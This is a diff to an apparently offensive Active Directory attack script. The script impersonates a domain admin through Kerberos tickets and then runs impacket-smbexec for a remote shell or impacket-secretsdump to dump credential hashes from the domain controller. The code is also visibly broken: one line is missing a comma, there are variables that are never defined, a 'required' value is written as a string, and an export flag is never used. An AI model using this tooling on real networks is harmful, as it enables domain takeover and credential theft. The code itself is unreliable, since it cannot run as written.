@@ -15,6 +15,7 @@ import random
 import ssl
 import os
 from binascii import unhexlify
+from impacket.smb3structs import FILE_BASIC_INFORMATION
 import ldapdomaindump
 import ldap3
 import time
@@ -47,10 +48,16 @@ def samtheadmin(username, password, domain, options):
     dc_host = dcinfo['name'][0].lower()
     dcfull = dcinfo['dNSHostName'][0].lower()
     logging.info(f'Selected Target {dcfull}')
-    domainAdmins = get_domain_admins(ldap_session, domain_dumper)
-    random_domain_admin = random.choice(domainAdmins)
+
+    if options.impersonate:
+        logging.info('test')
+    else:
+        domainAdmins = get_domain_admins(ldap_session, domain_dumper)
+        random_domain_admin = random.choice(domainAdmins)
+        logging.info(random_domain_admin)
+
     logging.info(f'Total Domain Admins {len(domainAdmins)}')
-    logging.info(f'will try to impersonat {random_domain_admin}')
+    logging.info(f'will try to impersonate {random_domain_admin}')
 
     # udata = get_user_info(username, ldap_session, domain_dumper)
     if MachineAccountQuota < 0:
@@ -118,9 +125,14 @@ def samtheadmin(username, password, domain, options):
     os.environ["KRB5CCNAME"] = adminticket
 
     # will do something else later on 
-    fbinary = "/usr/bin/impacket-smbexec"
-    if options.dump:
+    
+    if options.shell:
+        fbinary = "/usr/bin/impacket-smbexec"
+    elif options.dump:
         fbinary = "/usr/bin/impacket-secretsdump"
+    else:
+        fbinary = '/bin/echo "Action not specified, exiting!"; #'
+
     getashell = f"KRB5CCNAME='{adminticket}' {fbinary} -target-ip {options.dc_ip} -dc-ip {options.dc_ip} -k -no-pass @'{dcfull}'                                                                    "
     os.system(getashell)
 
@@ -137,8 +149,8 @@ if __name__ == '__main__':
     parser.add_argument('account', action='store', metavar='[domain/]username[:password]', help='Account used to authenticate to DC.')
     parser.add_argument('-domain-netbios', action='store', metavar='NETBIOSNAME', help='Domain NetBIOS name. Required if the DC has multiple domains.')
     parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
-    parser.add_argument('-shell', action='store_true', help='Drop a shell via smbexec')
-    parser.add_argument('-dump', action='store_true', help='Dump Hashs via secretsdump')
+    parser.add_argument('-shell', action='store_true', default=False, help='Drop a shell via smbexec')
+    parser.add_argument('-dump', action='store_true', default=False help='Dump Hashs via secretsdump')
 
     parser.add_argument('-port', type=int, choices=[139, 445, 636],
                        help='Destination port to connect to. SAMR defaults to 445, LDAPS to 636.')
@@ -159,6 +171,8 @@ if __name__ == '__main__':
                                                                       'Useful if you can\'t translate the FQDN.'
                                                                       'specified in the account parameter will be used')
     parser.add_argument('-use-ldaps', action='store_true', help='Use LDAPS instead of LDAP')
+    parser.add_argument('-impersonate', action='store', required='false', help='Account to attempt to impersonate via S4U2Self')
+    parser.add_argument('-export', action='store_true', help='Save resulting ST in a file rather than dumping/popping a shell')
 
 
 
